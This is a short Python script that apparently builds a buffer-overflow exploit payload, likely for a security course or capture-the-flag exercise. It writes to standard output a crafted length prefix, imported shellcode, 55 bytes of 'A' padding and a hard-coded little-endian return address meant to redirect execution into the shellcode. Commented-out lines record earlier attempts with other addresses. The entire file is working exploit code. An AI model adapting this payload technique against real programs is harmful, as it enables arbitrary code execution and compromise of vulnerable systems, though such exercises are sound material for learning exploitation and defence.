from shellcode import shellcode
import sys
sys.stdout.buffer.write(0x40000010.to_bytes(4, 'little') + shellcode + b'A'*55 + 0xfff69620.to_bytes(4, 'little'))

#0xfff69620.to_bytes(4, 'little'))
#sys.stdout.buffer.write(0x40000000.to_bytes(4, 'little') + shellcode + 0x08048d4b.to_bytes(4, 'little'))